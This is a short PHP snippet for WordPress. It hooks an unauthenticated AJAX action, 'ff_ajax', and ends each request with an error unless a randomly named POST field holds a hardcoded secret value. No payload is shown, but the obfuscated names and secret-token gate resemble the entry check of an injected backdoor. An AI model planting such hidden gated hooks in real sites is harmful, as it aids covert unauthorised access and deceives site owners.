<?php

function cc_role_pixel() {
	if (!isset($_POST["uzjwjizoh"]) || $_POST["uzjwjizoh"] !== "l1NluuQM") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'cc_role_pixel', 5, 1);
